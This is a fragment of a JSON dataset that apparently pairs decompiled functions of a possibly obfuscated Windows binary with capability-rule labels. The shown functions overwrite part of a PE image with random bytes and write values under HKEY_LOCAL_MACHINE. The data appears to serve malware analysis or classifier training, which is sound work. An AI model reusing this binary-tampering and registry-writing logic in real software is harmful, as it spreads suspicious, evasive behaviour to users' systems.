uint in_stack_ffffffd8;\n    uint in_stack_ffffffdc;\n    uint uVar36;\n    \n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    fcn.00401790(0x420374, 0xb, 0x420394, 10);\n    uVar2 = fcn.00401790(0x420374, 0xb, 0x4203a0, 0x12);\n    uVar2 = ((uVar2 & 0xff | (uVar2 >> 8) - 0x2b << 8) ^ 0x3d) + 0x7c28 ^\n            (extraout_DX & 0xff | (extraout_DX >> 8 | extraout_DX) << 8);\n    bVar27 = uVar2 < 0x4001;\n    bVar28 = uVar2 == 0x4001;\n    uVar36 = 0x401edc;\n    fcn.00401790(0x420374, 0xb, 0x4203b4, 4);\n    if ((bVar27 || bVar28) || (!bVar27 && !bVar28)) {\n        uVar36 = 0xc;\n        in_stack_ffffffdc = 0x4203b8;\n        in_stack_ffffffd8 = 0xb;\n        in_stack_ffffffd4 = 0x420374;\n    }\n    else {\n        *(unaff_EDI + 0x6a) = *(unaff_EDI + 0x6a) - &stack0xffffffe4;\n        unaff_EBP = unaff_EBP | *0x6a004277;\n    }\n    fcn.00401790(in_stack_ffffffd4, in_stack_ffffffd8, in_stack_ffffffdc, uVar36);\n    fcn.00401790(0x420374, 0xb, 0x4203c4, in_stack_ffffffd4);\n    cVar31 = '\\0';\n    cVar30 = (extraout_CX | 0x31fd) < 0;\n    uVar34 = fcn.00401790(0x420374, 0xb, 0x4203cc, 0xb);\n    uVar18 = uVar34;\n    if ((cVar31 != cVar30) || (cVar33 = (extraout_ECX << 0x10) >> 0x18,  cVar31 == cVar30)) {\n        cVar33 = extraout_ECX >> 8;\n    }\n    puVar8 = &stack0xffffffdc ^ *(unaff_EBX + 0x6a);\n    pcVar25 = (uVar34 >> 0x20) + 0xc;\n    *pcVar25 = *pcVar25 + cVar33;\n    puVar8[-1] = 0x420374;\n    puVar8[-2] = 0x401f6e;\n    Var35 = fcn.00401790(puVar8[-1], *puVar8, puVar8[1], puVar8[2]);\n    puVar8[6] = Var35;\n    *(puVar8 + 0x16) = Var35 >> 0x20;\n    puVar8[6] = 8;\n    puVar8[5] = 0x4203e4;\n    puVar8[4] = 0xb;\n    puVar8[3] = 0x420374;\n    puVar8[2] = 0x401fa1;\n    uVar36 = fcn.00401790(puVar8[3], puVar8[4], puVar8[5], puVar8[6]);\n    puVar8[6] = uVar36;\n    bVar27 = uVar36 == unaff_EBX;\n    puVar8[6] = 0xd;\n    puVar8[5] = 0x4203ec;\n    puVar8[4] = 0xb;\n    puVar9 = puVar8 + 3;\n    puVar8[3] = 0x420374;\n    puVar8[2] = 0x401fbc;\n    fcn.00401790(puVar8[3], puVar8[4], puVar8[5], puVar8[6]);\n    uVar1 = extraout_ECX_00 >> 8;\n    if (bVar27) {\ncode_r0x00401fda:\n        puVar10 = puVar8 + 2;\n        puVar8[2] = 0x18;\n        iVar19 = extraout_EDX;\n        goto code_r0x00401fd2;\n    }\n    puVar8[2] = unaff_EDI;\n    puVar22 = puVar8[2];\n    uVar36 = extraout_ECX_00;\n    iVar19 = extraout_EDX;\n    unaff_EDI = puVar22;\n    if (!bVar27) goto code_r0x00401fda;\n    while( true ) {\n        uVar1 = uVar36 >> 8;\n        unaff_EDI = puVar22 + 1;\n        uVar36 = in(iVar19);\n        *puVar22 = uVar36;\n        puVar10 = puVar9 + -1;\n        puVar11 = puVar9 + -1;\n        if (puVar9 < 1) break;\ncode_r0x00401fd2:\n        puVar23 = iVar19 + 0x18;\n        bVar27 = false;\n        bVar32 = false;\n        *puVar23 = *puVar23 ^ uVar1;\n        bVar28 = *puVar23 == 0;\n        puVar10[-1] = 0x4203fc;\n        puVar10[-2] = 0xb;\n        puVar9 = puVar10 + -3;\n        puVar10[-3] = 0x420374;\n        puVar10[-4] = 0x401fed;\n        uVar34 = fcn.00401790(puVar10[-3], puVar10[-2], puVar10[-1], *puVar10);\n        iVar19 = uVar34 >> 0x20;\n        pcVar25 = uVar34;\n        if (bVar27 || bVar28) {\ncode_r0x0040200f:\n            puVar10[-4] = 0x25;\n            puVar10[-5] = 0x420414;\n            puVar10[-6] = 0xb;\n            puVar10[-7] = 0x420374;\n            puVar10[-8] = 0x402022;\n            uVar34 = fcn.00401790(puVar10[-7], puVar10[-6], puVar10[-5], puVar10[-4]);\n            puVar10[4] = uVar34;\n            puVar10[3] = extraout_ECX_02;\n            puVar10[2] = uVar34 >> 0x20;\n            puVar10[1] = unaff_EBX;\n            *puVar10 = puVar10 + 5;\n            puVar10[-1] = unaff_EBP;\n            puVar10[-2] = uVar18;\n            puVar10[-3] = unaff_EDI;\n            unaff_EDI = puVar10[-3];\n            uVar18 = puVar10[-2];\n            unaff_EBP = puVar10[-1];\n            unaff_EBX = puVar10[1];\n            puVar10[4] = 10;\n            puVar10[3] = 0x42043c;\n            puVar11 = puVar10 + 2;\n            puVar10[2] = 0xb;\n            goto code_r0x0040204a;\n        }\n        *(puVar10 + -0xe) = uVar18;\n        uVar18 = uVar18 & 0xffff0000 | *(puVar10 + -0xe);\n        if (!bVar27 && !bVar28) goto code_r0x0040200f;\n        if (!bVar32) {\n            *(puVar10 + -4) = in_CS;\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *pcVar25 = *pcVar25 + uVar34;\n        *(unaff_EDI + 0x66) = *(unaff_EDI + 0x66) + (uVar34 >> 0x20);\n        puVar22 = 0xf5f9ce2;\n        *pcVar25 = *pcVar25 + uVar34;\n        uVar36 = extraout_ECX_01;\n    }\n    *(iVar19 + 0xc) = *(iVar19 + 0xc) + uVar1;\ncode_r0x0040204a:\n    puVar11[-1] = 0x420374;\n    puVar11[-2] = 0x402054;\n    uVar34 = fcn.00401790(puVar11[-1], *puVar11, puVar11[1], puVar11[2]);\n    puVar11[2] = uVar34;\n    puVar11[1] = extraout_ECX_03;\n    *puVar11 = uVar34 >> 0x20;\n    puVar11[-1] = unaff_EBX;\n    puVar11[-2] = puVar11 + 3;\n    puVar11[-3] = unaff_EBP;\n    puVar11[-4] = uVar18;\n    puVar11[-5] = unaff_EDI;\n    bVar27 = uVar34 >> 0x28 < 0x36;\n    puVar23 = puVar11[-5];\n    iVar19 = puVar11[-4];\n    uVar36 = puVar11[-1];\n    puVar11[2] = 0xc;\n    puVar11[1] = 0x420448;\n    *puVar11 = 0xb;\n    puVar12 = puVar11 + -1;\n    puVar11[-1] = 0x420374;\n    puVar11[-2] = 0x402079;\n    uVar1 = fcn.00401790(puVar11[-1], *puVar11, puVar11[1], puVar11[2]);\n    if (bVar27) {\ncode_r0x00402091:\n        puVar12 = puVar11 + -2;\n        puVar11[-2] = 0xd;\n    }\n    else {\n        *(puVar11 + -6) = puVar23;\n        puVar23 = puVar23 & 0xffff0000 | *(puVar11 + -6);\n        if (!bVar27) goto code_r0x00402091;\n    }\n    cVar30 = uVar1 - *puVar23;\n    *(puVar12 + -4) =\n         (in_NT & 1) * 0x4000 | SBORROW1(uVar1, *puVar23) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n         (cVar30 < '\\0') * 0x80 | (cVar30 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar30) & 1U) == 0) * 4 |\n         uVar1 < *puVar23 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n         (in_AC & 1) * 0x40000;\n    puVar13 = puVar12 + -8;\n    *(puVar12 + -8) = 0x40208b;\n    func_0x10188003();\n    cVar31 = '\\0';\n    cVar30 = '\\0';\n    puVar13[-1] = 0x420454;\n    puVar13[-2] = 0xb;\n    ppuVar14 = puVar13 + -3;\n    puVar13[-3] = 0x420374;\n    puVar13[-4] = 0x4020a4;\n    uVar34 = fcn.00401790(puVar13[-3], puVar13[-2], puVar13[-1], *puVar13);\n    piVar7 = uVar34 >> 0x20;\n    if ((cVar31 != cVar30) || (cVar31 == cVar30)) {\n        ppuVar14 = puVar13 + -4;\n        puVar13[-4] = 6;\n    }\n    *(uVar34 + -0x7ce92414) = extraout_ST0;\n    ppuVar14[-1] = uVar36;\n    in_AF = 9 < (uVar34 - 1U & 0xf) | in_AF;\n    *piVar7 = *piVar7 + 0x66adf84;\n    ppuVar14[-2] = 0x420464;\n    ppuVar14[-3] = 0xb;\n    ppuVar14[-4] = 0x420374;\n    ppuVar14[-5] = 0x4020cc;\n    uVar34 = fcn.00401790(ppuVar14[-4], ppuVar14[-3], ppuVar14[-2], ppuVar14[-1]);\n    ppuVar14[7] = uVar34;\n    ppuVar14[6] = uVar34 >> 0x20;\n    ppuVar14[5] = iVar19 + -1;\n    uVar20 = ppuVar14[5];\n    ppuVar14[7] = 0x5;\n    ppuVar14[6] = 0x42046c;\n    ppuVar14[5] = 0xb;\n    ppuVar14[4] = 0x420374;\n    ppuVar14[3] = 0x4020f6;\n    uVar5 = fcn.00401790(ppuVar14[4], ppuVar14[5], ppuVar14[6], ppuVar14[7]);\n    ppuVar14[7] = uVar5;\n    ppuVar14[7] = 0xd;\n    ppuVar14[6] = 0x420474;\n    ppuVar14[5] = 0xb;\n    ppuVar14[4] = 0x420374;\n    ppuVar14[3] = 0x402124;\n    uVar3 = fcn.00401790(ppuVar14[4], ppuVar14[5], ppuVar14[6], ppuVar14[7]);\n    ppuVar14[7] = uVar36;\n    *(ppuVar14 + 0x1a) = uVar3;\n    uVar36 = ppuVar14[7];\n    ppuVar14[7] = 0x19;\n    ppuVar14[6] = 0x420484;\n    ppuVar14[5] = 0xb;\n    ppuVar14[4] = 0x420374;\n    ppuVar14[3] = 0x402159;\n    uVar3 = fcn.00401790(ppuVar14[4], ppuVar14[5], ppuVar14[6], ppuVar14[7]);\n    *(ppuVar14 + 0x1e) = uVar3;\n    *(ppuVar14 + 0x1a) = extraout_ECX_04;\n    *(ppuVar14 + 0x16) = uVar20;\n    uVar5 = *(ppuVar14 + 0x16);\n    ppuVar14[7] = 0xf;\n    ppuVar14[6] = 0x4204a0;\n    ppuVar14[5] = 0xb;\n    ppuVar14[4] = 0x420374;\n    ppuVar14[3] = 0x402179;\n    uVar34 = fcn.00401790(ppuVar14[4], ppuVar14[5], ppuVar14[6], ppuVar14[7]);\n    ppuVar14[7] = uVar34;\n    ppuVar14[6] = extraout_ECX_05;\n    ppuVar14[5] = uVar34 >> 0x20;\n    ppuVar14[4] = uVar36;\n    ppuVar14[3] = ppuVar14 + 8;\n    ppuVar14[2] = extraout_EDX_00 + 0xd;\n    ppuVar14[1] = uVar5;\n    *ppuVar14 = puVar23 + 1;\n    uVar5 = *ppuVar14;\n    uVar18 = ppuVar14[4];\n    ppuVar14[7] = 0xe;\n    ppuVar14[6] = 0x4204b0;\n    ppuVar14[5] = 0xb;\n    ppuVar14[4] = 0x420374;\n    ppuVar14[3] = 0x4021a0;\n    uVar36 = fcn.00401790(ppuVar14[4], ppuVar14[5], ppuVar14[6], ppuVar14[7]);\n    ppuVar14[7] = uVar36;\n    bVar27 = (POPCOUNT((uVar36 & 0xae) - 1 & 0xff) & 1U) == 0;\n    ppuVar14[7] = 0xd;\n    ppuVar14[6] = 0x4204c0;\n    ppuVar14[5] = 0xb;\n    ppuVar15 = ppuVar14 + 4;\n    ppuVar14[4] = 0x420374;\n    ppuVar14[3] = 0x4021ce;\n    uVar34 = fcn.00401790(ppuVar14[4], ppuVar14[5], ppuVar14[6], ppuVar14[7]);\n    if (!bVar27) {\n        ppuVar14[3] = uVar5;\n        uVar5 = ppuVar14[3];\n        if (bVar27) goto code_r0x004021d8;\n    }\n    ppuVar14[3] = 0xc;\n    ppuVar14[2] = 0x4204d0;\n    ppuVar15 = ppuVar14 + 1;\n    ppuVar14[1] = 0xb;\ncode_r0x004021d8:\n    uVar3 = *0x6a17b43a >> 0x20;\n    uVar17 = *0x6a17b43a;\n    puVar23 = uVar34 + ((uVar34 >> 0x20) + 1U | 0x68) * 2;\n    *puVar23 = *puVar23 << 1 | *puVar23 < '\\0';\n    pcVar25 = uVar34 + 0xb;\n    *pcVar25 = *pcVar25 + extraout_CH;\n    ppuVar15[-1] = 0x420374;\n    ppuVar15[-2] = 0x4021f8;\n    fcn.00401790(ppuVar15[-1], *ppuVar15, ppuVar15[1], ppuVar15[2]);\n    ppuVar15[6] = extraout_ECX_06;\n    ppuVar15[5] = extraout_EDX_01;\n    ppuVar15[6] = 0xf;\n    ppuVar15[5] = 0x4204dc;\n    ppuVar15[4] = 0xb;\n    ppuVar15[3] = 0x420374;\n    ppuVar15[2] = 0x40222d;\n    fcn.00401790(ppuVar15[3], ppuVar15[4], ppuVar15[5], ppuVar15[6]);\n    uVar2 = uVar18;\n    *(ppuVar15 + 0x1a) = uVar2;\n    *(ppuVar15 + 0x16) = extraout_EDX_02;\n    *(ppuVar15 + 0x12) = uVar5;\n    cVar31 = '\\0';\n    cVar30 = (uVar2 ^ extraout_CX_00) < 0;\n    puVar24 = *(ppuVar15 + 0x12);\n    uVar2 = *(ppuVar15 + 0x1a);\n    ppuVar15[6] = 0xb;\n    ppuVar15[5] = 0x4204ec;\n    ppuVar15[4] = 0xb;\n    ppuVar15[3] = 0x420374;\n    ppuVar15[2] = 0x402250;\n    uVar34 = fcn.00401790(ppuVar15[3], ppuVar15[4], ppuVar15[5], ppuVar15[6]);\n    puVar16 = ppuVar15 + 3;\n    puVar22 = puVar24;\n    if (cVar31 == cVar30) {\n        *(ppuVar15 + 10) = uVar34 >> 0x20;\n        uVar6 = *(ppuVar15 + 10);\n        puVar16 = ppuVar15 + 3;\n        if (cVar31 != cVar30) {\n            out(0xc4, uVar34);\n            *(ppuVar15 + 2) = uVar3;\n            *(ppuVar15 + 1) = in_SS;\n            puVar22 = puVar24 + 1;\n            *puVar24 = uVar34;\n            *ppuVar15 = uVar34 >> 0x20 & 0xffff0000 | uVar6 & 0xffffff00 | uVar6 ^ extraout_CL;\n            puVar16 = ppuVar15;\n        }\n    }\n    puVar16[-1] = 0xb;\n    puVar16[-2] = 0x4204f8;\n    puVar16[-3] = 0xb;\n    puVar16[-4] = 0x420374;\n    puVar16[-5] = 0x402284;\n    fcn.00401790(puVar16[-4], puVar16[-3], puVar16[-2], puVar16[-1]);\n    puVar16[3] = uVar18 & 0xffff0000 | uVar2;\n    puVar16[2] = extraout_EDX_03;\n    uVar36 = puVar16[3];\n    puVar16[3] = 0xb;\n    puVar16[2] = 0x420504;\n    puVar16[1] = 0xb;\n    *puVar16 = 0x420374;\n    puVar16[-1] = 0x4022a5;\n    fcn.00401790(*puVar16, puVar16[1], puVar16[2], puVar16[3]);\n    puVar16[3] = uVar36;\n    *(puVar16 + 10) = extraout_DX_00;\n    *(puVar16 + 2) = puVar22;\n    uVar2 = *(puVar16 + 2);\n    uVar5 = puVar16[3];\n    puVar16[3] = 10;\n    puVar16[2] = 0x420510;\n    puVar16[1] = 0xb;\n    *puVar16 = 0x420374;\n    puVar16[-1] = 0x4022c9;\n    uVar36 = fcn.00401790(*puVar16, puVar16[1], puVar16[2], puVar16[3]);\n    puVar16[3] = uVar36;\n    *(puVar16 + 10) = uVar5;\n    puVar16[3] = 0xc;\n    puVar16[2] = 0x42051c;\n    puVar16[1] = 0xb;\n    *puVar16 = 0x420374;\n    puVar16[-1] = 0x4022f7;\n    uVar36 = fcn.00401790(*puVar16, puVar16[1], puVar16[2], puVar16[3]);\n    puVar16[3] = uVar36;\n    puVar16[2] = puVar22 & 0xffff0000 | uVar2;\n    puVar16[1] = 0x34a96cf4;\n    puVar22 = puVar16 + 1;\n    do {\n        puVar21 = *puVar22;\n        pcVar25 = puVar22[1];\n        puVar22[2] = 0xe;\n        puVar22[1] = 0x420528;\n        *puVar22 = 0xb;\n        puVar22[-1] = 0x420374;\n        puVar22[-2] = 0x402317;\n        fcn.00401790(puVar22[-1], *puVar22, puVar22[1], puVar22[2]);\n        puVar22[2] = extraout_ECX_07;\n        *(puVar22 + 6) = extraout_DX_01;\n        cVar31 = '\\0';\n        cVar30 = '\\0';\n        uVar29 = ((extraout_ECX_07 >> 8 ^ extraout_AH) + 1 & 0x27) == 0;\n        puVar22[2] = 0x11;\n        puVar22[1] = 0x420538;\n        *puVar22 = 0xb;\n        puVar22[-1] = 0x420374;\n        puVar22[-2] = 0x402341;\n        uVar18 = fcn.00401790(puVar22[-1], *puVar22, puVar22[1], puVar22[2]);\n        if (cVar31 != cVar30) goto code_r0x0040235c;\n        puVar22[-2] = pcVar25;\n        pcVar25 = puVar22[-2];\n        if (cVar31 == cVar30) goto code_r0x0040235c;\n        *(puVar22 + -1) = in_ES;\n        cVar30 = -0xc;\n        puVar21 = puVar21 + -1;\n        while( true ) {\n            pcVar26 = pcVar25 | uVar17;\n            pcVar25 = pcVar26 + 1;\n            *pcVar26 = uVar18;\n            cVar31 = SBORROW1(cVar30, cVar30);\n            cVar30 = '\\0';\n            uVar29 = uVar18 + (uVar18 >> 8) * 'y' == '\\0';\ncode_r0x0040235c:\n            puVar22[-2] = 0x13;\n            puVar22[-3] = 0x42054c;\n            puVar22[-4] = 0xb;\n            puVar22[-5] = 0x420374;\n            puVar22[-6] = 0x40236f;\n            uVar1 = fcn.00401790(puVar22[-5], puVar22[-4], puVar22[-3], puVar22[-2]);\n            if ((!uVar29 && cVar31 == cVar30) && (uVar29 || cVar31 != cVar30)) break;\n            puVar22[-6] = 0x14;\n            puVar22[-7] = 0x420560;\n            puVar22[-8] = 0xb;\n            puVar22[-9] = 0x420374;\n            puVar22[-10] = 0x402394;\n            iVar4 = fcn.00401790(puVar22[-9], puVar22[-8], puVar22[-7], puVar22[-6]);\n            puVar22[2] = pcVar25;\n            uVar2 = (pcVar25 | 0x74e3) - iVar4;\n            cVar33 = '\\0';\n            cVar31 = '\\0';\n            bVar27 = (uVar2 & 0x1a8) == 0;\n            uVar29 = (POPCOUNT(uVar2 & 0xa8) & 1U) == 0;\n            pcVar25 = puVar22[2];\n            puVar22[2] = 0x33;\n            puVar22[1] = 0x420574;\n            *puVar22 = 0xb;\n            puVar22[-1] = 0x420374;\n            puVar22[-2] = 0x4023c5;\n            cVar30 = '\\0';\n            uVar3 = fcn.00401790(puVar22[-1], *puVar22, puVar22[1], puVar22[2]);\n            if ((bVar27 || cVar33 != cVar31) || (!bVar27 && cVar33 == cVar31)) {\n                puVar22[-2] = 10;\n                puVar22[-3] = 0x4205a8;\n                puVar22[-4] = 0xb;\n                puVar22[-5] = 0x420374;\n                puVar22[-6] = 0x4023ea;\n                fcn.00401790(puVar22[-5], puVar22[-4], puVar22[-3], puVar22[-2]);\n                if ((!bVar27) && (bVar27)) {\n                    out(*puVar21, extraout_DX_02);\n                }\n                puVar22[-6] = 4;\n                puVar22[-7] = 0x4205b4;\n                puVar22[-8] = 0xb;\n                puVar22[-9] = 0x420374;\n                puVar22[-10] = 0x402415;\n                iVar19 = fcn.00401790(puVar22[-9], puVar22[-8], puVar22[-7], puVar22[-6]);\n                if (!uVar29) {\n                    puVar22[-10] = pcVar25;\n                    pcVar25 = puVar22[-10];\n                    puVar24 = puVar22 + -1;\n                    if (uVar29) goto code_r0x0040241f;\n                }\n                puVar22[-10] = 5;\n                puVar22[-0xb] = 0x4205b8;\n                puVar22[-0xc] = 0xb;\n                puVar24 = puVar22 + -4;\ncode_r0x0040241f:\n                *(iVar19 + 0xb) = *(iVar19 + 0xb) + extraout_CH_00;\n                puVar24[-9] = 0x420374;\n                puVar24[-10] = 0x40243f;\n                uVar34 = fcn.00401790(puVar24[-9], puVar24[-8], puVar24[-7], puVar24[-6]);\n                puVar24[6] = uVar34;\n                puVar24[5] = uVar34 >> 0x20;\n                puVar24[4] = pcVar25;\n                puVar24[6] = 6;\n                puVar24[5] = 0x4205c0;\n                puVar24[4] = 0xb;\n                puVar24[3] = 0x420374;\n                puVar24[2] = 0x40245d;\n                fcn.00401790(puVar24[3], puVar24[4], puVar24[5], puVar24[6]);\n                puVar24[6] = extraout_EDX_04;\n                puVar24[6] = 0xc;\n                puVar24[5] = 0x4205c8;\n                puVar24[4] = 0xb;\n                puVar24[3] = 0x420374;\n                puVar24[2] = 0x40247d;\n                fcn.00401790(puVar24[3], puVar24[4], puVar24[5], puVar24[6]);\n                puVar24[6] = extraout_ECX_10;\n                puVar24[5] = 0x34a96cf4;\n                bVar27 = false;\n                puVar24[6] = 0xc;\n                puVar24[5] = 0x4205d4;\n                puVar24[4] = 0xb;\n                puVar24[3] = 0x420374;\n                puVar24[2] = 0x4024b3;\n                fcn.00401790(puVar24[3], puVar24[4], puVar24[5], puVar24[6]);\n                if ((bVar27) || (puVar22 = puVar24 + 3,  !bVar27)) {\n                    puVar24[2] = 0x2a;\n                    puVar24[1] = 0x42060c;\n                    *puVar24 = 0xb;\n                    puVar22 = puVar24;\n                }\n                *(extraout_EDX_05 + 0xc) = *(extraout_EDX_05 + 0xc) + extraout_CH_01;\n                puVar22[-1] = 0x420374;\n                puVar22[-2] = 0x4024d7;\n                uVar36 = fcn.00401790(puVar22[-1], *puVar22, puVar22[1], puVar22[2]);\n                puVar22[6] = uVar36;\n                puVar22[5] = extraout_ECX_11;\n                puVar22[6] = 0xb;\n                puVar22[5] = 0x420638;\n                puVar22[4] = 0xb;\n                puVar22[3] = 0x420374;\n                puVar22[2] = 0x402507;\n                fcn.00401790(puVar22[3], puVar22[4], puVar22[5], puVar22[6]);\n                puVar22[2] = 0x41;\n                puVar22[1] = 0x420694;\n                *puVar22 = 0xb;\n                puVar22[-1] = 0x420374;\n                puVar22[-2] = 0x40251a;\n                fcn.00401790(puVar22[-1], *puVar22, puVar22[1], puVar22[2]);\n                puVar22[-2] = 0x33;\n                puVar22[-3] = 0x4206d8;\n                puVar22[-4] = 0xb;\n                puVar22[-5] = 0x420374;\n                puVar22[-6] = 0x40252d;\n                fcn.00401790(puVar22[-5], puVar22[-4], puVar22[-3], puVar22[-2]);\n                puVar22[-6] = 0x4b;\n                puVar22[-7] = 0x42070c;\n                puVar22[-8] = 0xb;\n                puVar22[-9] = 0x420374;\n                puVar22[-10] = 0x402540;\n                fcn.00401790(puVar22[-9], puVar22[-8], puVar22[-7], puVar22[-6]);\n                puVar22[6] = 0x39;\n                puVar22[5] = 0x420758;\n                puVar22[4] = 0xb;\n                puVar22[3] = 0x420374;\n                puVar22[2] = 0x402556;\n                fcn.00401790(puVar22[3], puVar22[4], puVar22[5], puVar22[6]);\n                puVar22[2] = 8;\n                puVar22[1] = 0x420794;\n                *puVar22 = 0xb;\n                puVar22[-1] = 0x420374;\n                puVar22[-2] = 0x402569;\n                fcn.00401790(puVar22[-1], *puVar22, puVar22[1], puVar22[2]);\n                puVar22[-2] = 0x14;\n                puVar22[-3] = 0x42079c;\n                puVar22[-4] = 0xb;\n                puVar22[-5] = 0x420374;\n                puVar22[-6] = 0x40257c;\n                fcn.00401790(puVar22[-5], puVar22[-4], puVar22[-3], puVar22[-2]);\n                return;\n            }\n            in_AF = 9 < (uVar3 & 0xf) | in_AF;\n            uVar18 = CONCAT11((uVar3 >> 8) + in_AF, uVar3 + in_AF * '\\x06') & 0xff0f;\n            if (extraout_ECX_09 != 0) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n        }\n        in_AF = 9 < (uVar1 & 0xf) | in_AF;\n        puVar22 = puVar22 + -5;\n        if (extraout_ECX_08 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    } while( true );\n}\n",
        "token_count": 9234
    },
    "00402dd0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402f7d) overlaps instruction at (ram,0x00402f7b)\n// \n// WARNING: Removing unreachable block (ram,0x00402f7a)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402dd0(int16_t *arg_8h)\n\n{\n    char *pcVar1;\n    int16_t *in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char in_CL;\n    char extraout_DH;\n    int32_t unaff_ESI;\n    uint *puVar4;\n    uint *puVar5;\n    bool bVar6;\n    char in_stack_00000056;\n    uint *var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if ((*0x10 == 0x10 || &stack0xfffffffc < 0xc) || (*0x10 != 0x10 && SBORROW4(&stack0xfffffffc, 0xc) == &var_ch < 0))\n    {\n        bVar6 = *arg_8h == 0x5a4d;\n        in_EAX = arg_8h;\n    }\n    else {\n        *(unaff_ESI + -0x7f) = *(unaff_ESI + -0x7f) | in_EAX >> 8;\n        bVar6 = in_stack_00000056 == in_CL;\n    }\n    if (!bVar6) {\n        return 0;\n    }\n    if (*(*(in_EAX + 0x1e) + in_EAX) != 0x4550) {\n        return 0;\n    }\n    if ((*(in_EAX + 0x1e) + in_EAX)[0x16] != 0) {\n        return 0;\n    }\n    var_4h = 0x40;\n    if (*(arg_8h + 0x1e) < 0x81) {\n        return 0;\n    }\n    if (*(arg_8h + 0x1e) < 0xc0) {\n        var_4h = *(arg_8h + 0x1e) - 0x80;\n    }\n    uVar3 = var_4h;\n    var_ch = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_();\n    bVar6 = (POPCOUNT(var_ch & 0xff) & 1U) == 0;\n    if (var_ch == NULL) {\n        return 0;\n    }\n    if (bVar6) {\ncode_r0x00402f04:\n        var_8h = 0;\n        if (uVar3 == 0) goto code_r0x00402f42;\n    }\n    else {\n        if (!bVar6) goto code_r0x00402f04;\n        *var_ch = *var_ch + var_ch;\n        pcVar1 = uVar3 + 0x33;\n        *pcVar1 = *pcVar1 + extraout_DH;\n    }\n    do {\n        iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n        uVar3 = var_8h + 1;\n        *(var_8h + var_ch) = iVar2 % 0xff;\n        var_8h = uVar3;\n    } while (uVar3 < var_4h);\ncode_r0x00402f42:\n    puVar4 = var_ch;\n    puVar5 = arg_8h + 0x40;\n    for (uVar3 = var_4h >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    for (uVar3 = var_4h & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar5 = *puVar4;\n        puVar4 = puVar4 + 1;\n        puVar5 = puVar5 + 1;\n    }\n    func_0x00404bc0();\n    return 1;\n}\n",
        "token_count": 944
    },
    "00403e20": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403e20(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x4203fc, arg_8h);\n    (*pcVar2)(&var_264h, 0x420414, arg_8h);\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x42043c;\n    var_30h = 0x420448;\n    var_2ch = 0x420454;\n    var_28h = 0x420464;\n    var_24h = 0x42046c;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1088
    },
    "00403fd0": {
        "rules": [
